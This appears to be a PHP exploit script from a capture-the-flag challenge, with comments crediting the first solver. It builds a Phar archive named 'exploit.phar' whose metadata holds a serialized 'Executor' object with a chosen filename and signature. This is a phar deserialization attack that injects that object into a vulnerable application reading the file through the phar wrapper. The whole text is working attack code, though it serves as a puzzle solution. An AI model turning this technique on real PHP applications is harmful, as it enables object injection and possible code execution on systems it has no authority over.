<?php
            // graz XeR, the first to solve it! thanks for the feedback!
            // ~morla
            class Executor{
		private $filename='taldgan.php';
                private $signature='6ae14bb82be23c2cbd46a47366cf08c0';
            }
	$phar = new Phar('exploit.phar');
	$phar->startBuffering();
	$phar->addFromString("payload.php", "payload");
	$phar->setStub('<?php __HALT_COMPILER(); ? >');

	$object = new Executor();
	$phar->setMetadata($object);
	$phar->stopBuffering();
?>
 
